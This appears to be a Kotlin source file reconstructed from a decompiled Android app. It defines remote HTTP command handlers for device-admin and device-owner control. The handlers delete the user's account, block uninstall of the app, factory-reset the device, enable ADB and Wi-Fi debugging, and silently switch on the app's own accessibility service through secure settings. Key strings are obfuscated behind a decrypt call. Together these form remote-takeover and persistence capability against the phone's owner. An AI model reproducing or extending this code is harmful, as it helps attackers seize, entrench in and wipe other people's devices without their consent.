package com.storm.safe.rock.service.modules.routes

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.app.admin.DevicePolicyManager
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.storm.safe.rock.receiver.zbrefryi
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.account.AccountProtectionManager
import com.storm.safe.rock.service.modules.RemoteConfigManager.Companion.makeErrorResponse
import com.storm.safe.rock.service.modules.RemoteConfigManager.Companion.makeTextResponse
import com.storm.safe.rock.service.modules.command.CommandDispatcher
import com.storm.safe.rock.util.StringUtil
import org.json.JSONObject

/**
 * Device admin, settings toggle, and write-settings route handlers.
 *
 * Extracted from RemoteConfigManager (JADX: C0322a7).
 * JADX methods: d4, d5, b4, e0, e1, d7, d9, d8, c7, e2.
 */
object DeviceAdminRouteHandlers {
    private const val TAG = "LocalHttpServer"

    // ---------------------------------------------------------------
    // Device admin -- JADX: d4, d5, b4
    // ---------------------------------------------------------------

    /**
     * /startAdminActive -- enter device admin activation mode.
     * JADX: m211622d4 (d4)
     */
    @JvmStatic
    fun startAdminActive(context: Context): JSONObject {
        return try {
            val prefName = StringUtil.decrypt("IkowPkAxAg9UJSJPEC5ENgs=")
            val prefs = context.getSharedPreferences(prefName, 0)
            if (!prefs.getBoolean(prefName, false)) {
                prefs.edit()
                    .putBoolean(prefName, true)
                    .putLong("isAdminActivating_start", System.currentTimeMillis())
                    .commit()
                Log.d(TAG, "★ isAdminActivating = true（进入 Device Owner 激活模式）")
            }
            val apm = AccountProtectionManager.getInstance(context)
            if (apm.hasAccount()) {
                apm.removeAccount()
                Log.d(TAG, "★ 账户已删除（为 Device Owner 设置做准备）")
            }
            makeTextResponse("isAdminActivating=true, accounts removed")
        } catch (e: Exception) {
            Log.e(TAG, "handleStartAdminActive 异常", e)
            makeErrorResponse("startAdminActive 异常: ${e.message}")
        }
    }

    /**
     * /stopAdminActive -- exit device admin activation mode.
     * JADX: m211623d5 (d5)
     */
    @JvmStatic
    fun stopAdminActive(context: Context): JSONObject {
        return try {
            val prefName = StringUtil.decrypt("IkowPkAxAg9UJSJPEC5ENgs=")
            context.getSharedPreferences(prefName, 0)
                .edit()
                .putBoolean(prefName, false)
                .remove("isAdminActivating_start")
                .commit()
            Log.d(TAG, "★ isAdminActivating = false（退出 Device Owner 激活模式，恢复账户保护）")
            makeTextResponse("isAdminActivating=false")
        } catch (e: Exception) {
            Log.e(TAG, "handleStopAdminActive 异常", e)
            makeErrorResponse("stopAdminActive 异常: ${e.message}")
        }
    }

    /**
     * /activeDeviceOwner -- set uninstall blocked if device owner.
     * JADX: m211607b4 (b4)
     */
    @JvmStatic
    fun activeDeviceOwner(context: Context): JSONObject {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val cn = ComponentName(context, zbrefryi::class.java)
            if (!dpm.isDeviceOwnerApp(context.packageName)) {
                return makeTextResponse("Not Device Owner")
            }
            dpm.setUninstallBlocked(cn, context.packageName, true)
            Log.d(TAG, "🔒 [DeviceOwner] 已设置 setUninstallBlocked=true")
            makeTextResponse("Already Device Owner, setUninstallBlocked=true")
        } catch (e: Exception) {
            Log.e(TAG, "handleActiveDeviceOwner 异常", e)
            makeErrorResponse("activeDeviceOwner 异常: ${e.message}")
        }
    }

    /**
     * /uninstallPolicy -- toggle uninstall protection.
     * JADX: m211628e0 (e0)
     * Vendor is suspend; translated to synchronous dispatch via runBlocking.
     */
    @JvmStatic
    fun uninstallPolicy(context: Context, params: Map<String, String>, commandDispatcher: CommandDispatcher?): JSONObject {
        return try {
            val uninstallStr = params["uninstall"]
            val uninstall = uninstallStr?.let { java.lang.Boolean.parseBoolean(it) } ?: false
            val activeAdminStr = params["activeAdmin"]
            val activeAdmin = activeAdminStr?.let { java.lang.Boolean.parseBoolean(it) } ?: true
            val uninstallCode = params["uninstallCode"] ?: ""

            Log.d(TAG, "★ [uninstallPolicy] uninstall=$uninstall, activeAdmin=$activeAdmin, " +
                    "code=${if (uninstallCode.isNotEmpty()) "***" else "empty"}")

            val dispatcher = commandDispatcher
            if (uninstall) {
                // Disable protection
                val json = JSONObject()
                json.put(
                    StringUtil.decrypt("KFYcN0w2CA=="),
                    StringUtil.decrypt("D3AiG28UKRFiHwJ3Ig5sFCARZwMEbTQZeREjAA==")
                )
                if (dispatcher != null) {
                    try {
                        kotlinx.coroutines.runBlocking { dispatcher.dispatch(json) }
                    } catch (_: Exception) {
                    }
                }
                Log.d(TAG, "🔓 [uninstallPolicy] 已通知禁用防卸载保护")
            } else {
                // Enable protection
                val json = JSONObject()
                json.put(
                    StringUtil.decrypt("KFYcN0w2CA=="),
                    StringUtil.decrypt("DncwGGEdMxt5GAVqJRthFDMeZR4ffDIOZBci")
                )
                if (dispatcher != null) {
                    try {
                        kotlinx.coroutines.runBlocking { dispatcher.dispatch(json) }
                    } catch (_: Exception) {
                    }
                }
                Log.d(TAG, "🔒 [uninstallPolicy] 已通知启用防卸载保护")
            }

            makeTextResponse("uninstallPolicy set: uninstall=$uninstall, activeAdmin=$activeAdmin")
        } catch (e: Exception) {
            Log.e(TAG, "handleUninstallPolicy 异常", e)
            makeErrorResponse("uninstallPolicy 异常: ${e.message}")
        }
    }

    /**
     * /wipeData, /factoryReset, /reset, /restore -- factory reset.
     * JADX: m211629e1 (e1)
     */
    @JvmStatic
    fun wipeData(context: Context, params: Map<String, String>): JSONObject {
        Log.w(TAG, "⚠️⚠️⚠️ 收到恢复出厂设置请求 ⚠️⚠️⚠️")
        return try {
            val wipeExternalStr = params["wipeExternal"]
            val wipeExternal = wipeExternalStr?.let { java.lang.Boolean.parseBoolean(it) } ?: false

            val isAdmin = zbrefryi.isAdminActive(context)
            val isOwner = zbrefryi.isDeviceOwner(context)
            Log.d(TAG, "📊 权限检查: isAdmin=$isAdmin, isOwner=$isOwner")

            if (!isAdmin) {
                Log.e(TAG, "没有 Device Admin 权限，无法执行 wipeData")
                val json = JSONObject()
                json.put("code", 403)
                json.put("success", false)
                json.put("message", "没有设备管理员权限")
                json.put("isAdmin", false)
                json.put("isOwner", false)
                return json
            }

            Log.w(TAG, "★★★ 正在执行 wipeData，设备即将重置 ★★★")
            if (zbrefryi.wipeDevice(context, wipeExternal)) {
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", true)
                json.put("message", "wipeData 已调用，设备正在重置")
                json
            } else {
                val json = JSONObject()
                json.put("code", 500)
                json.put("success", false)
                json.put("message", "wipeData 调用失败")
                json.put("isAdmin", isAdmin)
                json.put("isOwner", isOwner)
                json
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "wipeData 安全异常", e)
            val json = JSONObject()
            json.put("code", 403)
            json.put("success", false)
            json.put("message", "权限不足: ${e.message}")
            json
        } catch (e: Exception) {
            Log.e(TAG, "wipeData 异常", e)
            makeErrorResponse("wipeData 失败: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Settings toggles -- JADX: d7, d9, d8
    // ---------------------------------------------------------------

    /**
     * Toggle ADB debug.
     * JADX: m211625d7 (d7) -- /activeADBDebug, /closeADBDebug
     */
    @JvmStatic
    fun toggleAdb(context: Context, enable: Boolean): JSONObject {
        return try {
            Settings.Global.putInt(
                context.contentResolver, "adb_enabled", if (enable) 1 else 0
            )
            Log.d(TAG, "🔧 ADB 调试: ${if (enable) "开启" else "关闭"}")
            makeTextResponse("adbDebug ${if (enable) "enabled" else "disabled"}")
        } catch (e: Exception) {
            makeErrorResponse("adbDebug toggle 异常: ${e.message}")
        }
    }

    /**
     * Toggle WiFi debug.
     * JADX: m211627d9 (d9) -- /activeWifiDebug, /closeWifiDebug
     */
    @JvmStatic
    fun toggleWifi(context: Context, enable: Boolean): JSONObject {
        return try {
            if (Build.VERSION.SDK_INT >= 30) {
                try {
                    Settings.Global.putInt(
                        context.contentResolver, "adb_wifi_enabled", if (enable) 1 else 0
                    )
                } catch (_: Exception) {
                }
            }
            Log.d(TAG, "🔧 WiFi 调试: ${if (enable) "开启" else "关闭"}")
            makeTextResponse("wifiDebug ${if (enable) "enabled" else "disabled"}")
        } catch (e: Exception) {
            makeErrorResponse("wifiDebug toggle 异常: ${e.message}")
        }
    }

    /**
     * Toggle developer options.
     * JADX: m211626d8 (d8) -- /activeDevelopment, /closeDevelopment
     */
    @JvmStatic
    fun activeDevelopment(context: Context, enable: Boolean): JSONObject {
        return try {
            val canWrite = Settings.System.canWrite(context)
            var hasSecure = false
            try {
                if (context.checkCallingOrSelfPermission(
                        "android.permission.WRITE_SECURE_SETTINGS"
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    hasSecure = true
                }
            } catch (_: Exception) {
            }
            if (!canWrite && !hasSecure) {
                Log.w(TAG, "🔧 开发者选项: 无 WRITE_SETTINGS 或 WRITE_SECURE_SETTINGS 权限")
                return makeErrorResponse("无系统设置修改权限")
            }
            Settings.Global.putInt(
                context.contentResolver,
                "development_settings_enabled",
                if (enable) 1 else 0
            )
            val actual = Settings.Global.getInt(
                context.contentResolver, "development_settings_enabled", -1
            )
            val expected = if (enable) 1 else 0
            if (actual == expected) {
                Log.d(TAG, "🔧 开发者选项: ${if (enable) "开启" else "隐藏"} 成功")
                makeTextResponse("development ${if (enable) "enabled" else "disabled"}")
            } else {
                Log.w(TAG, "🔧 开发者选项: 写入后验证失败 (期望=$expected, 实际=$actual)")
                makeErrorResponse("development toggle 验证失败: actual=$actual")
            }
        } catch (e: Exception) {
            Log.e(TAG, "开发者选项异常", e)
            makeErrorResponse("development toggle 异常: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Write settings -- JADX: c7, e2
    // ---------------------------------------------------------------

    /**
     * /openWriteSecure -- open write settings permission page.
     * JADX: m211617c7 (c7)
     */
    @JvmStatic
    fun openWriteSecure(context: Context): JSONObject {
        return try {
            if (Settings.System.canWrite(context)) {
                return makeTextResponse("Write settings permission already granted")
            }
            val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
            intent.data = Uri.parse("package:${context.packageName}")
            intent.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TASK or
                        Intent.FLAG_ACTIVITY_NO_ANIMATION
            )
            context.startActivity(intent)
            makeTextResponse("Write settings permission requested")
        } catch (e: Exception) {
            Log.e(TAG, "handleOpenWriteSecure 异常", e)
            makeErrorResponse("openWriteSecure 异常: ${e.message}")
        }
    }

    /**
     * /writeAccessibility -- write accessibility settings via secure settings or device owner.
     * JADX: m211630e2 (e2)
     */
    @JvmStatic
    fun writeAccessibility(context: Context, params: Map<String, String>): JSONObject {
        val action = params["action"] ?: "enable"
        val pkg = params["package"] ?: context.packageName
        val ourService = "$pkg/${MyAccessibilityService::class.java.name}"

        try {
            val resolver = context.contentResolver
            if (action == "enable") {
                var current = Settings.Secure.getString(
                    resolver, "enabled_accessibility_services"
                ) ?: ""
                val svcString = if (current.isNotEmpty()) {
                    if (current.contains(pkg)) current else "$current:$ourService"
                } else {
                    ourService
                }

                // Try DeviceOwner first
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
                        as? DevicePolicyManager
                if (dpm != null && dpm.isDeviceOwnerApp(context.packageName)) {
                    val cn = ComponentName(context, zbrefryi::class.java)
                    dpm.setSecureSetting(cn, "enabled_accessibility_services", svcString)
                    dpm.setSecureSetting(cn, "accessibility_enabled", "1")
                    Log.d(TAG, "✅ [writeAccessibility] DeviceOwner enable 成功")
                    return makeTextResponse("enabled via DeviceOwner")
                }

                // Fallback to Java API
                Settings.Secure.putString(
                    resolver, "enabled_accessibility_services", svcString
                )
                Settings.Secure.putInt(resolver, "accessibility_enabled", 1)
                val after = Settings.Secure.getString(
                    resolver, "enabled_accessibility_services"
                ) ?: ""
                return if (after.contains(pkg)) {
                    Log.d(TAG, "✅ [writeAccessibility] Java API enable 成功")
                    makeTextResponse("enabled via Java API")
                } else {
                    Log.w(TAG, "⚠️ [writeAccessibility] Java API enable 写入未生效 after=$after")
                    makeErrorResponse("Java API write did not take effect, after=$after")
                }
            } else if (action == "disable") {
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
                        as? DevicePolicyManager
                if (dpm != null && dpm.isDeviceOwnerApp(context.packageName)) {
                    val cn = ComponentName(context, zbrefryi::class.java)
                    dpm.setSecureSetting(cn, "enabled_accessibility_services", "")
                    dpm.setSecureSetting(cn, "accessibility_enabled", "0")
                    Log.d(TAG, "✅ [writeAccessibility] DeviceOwner disable 成功")
                    return makeTextResponse("disabled via DeviceOwner")
                }

                Settings.Secure.putString(resolver, "enabled_accessibility_services", "")
                Settings.Secure.putInt(resolver, "accessibility_enabled", 0)
                val after = Settings.Secure.getString(
                    resolver, "enabled_accessibility_services"
                ) ?: ""
                return if (after.isEmpty() || !after.contains(pkg)) {
                    Log.d(TAG, "✅ [writeAccessibility] Java API disable 成功")
                    makeTextResponse("disabled via Java API")
                } else {
                    Log.w(TAG, "⚠️ [writeAccessibility] Java API disable 未生效 after=$after")
                    makeErrorResponse("Java API disable did not take effect, after=$after")
                }
            } else {
                return makeErrorResponse("unknown action: $action")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "[writeAccessibility] 无 WRITE_SECURE_SETTINGS 权限", e)
            return makeErrorResponse("no WRITE_SECURE_SETTINGS permission: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "[writeAccessibility] 异常", e)
            return makeErrorResponse("writeAccessibility error: ${e.message}")
        }
    }
}
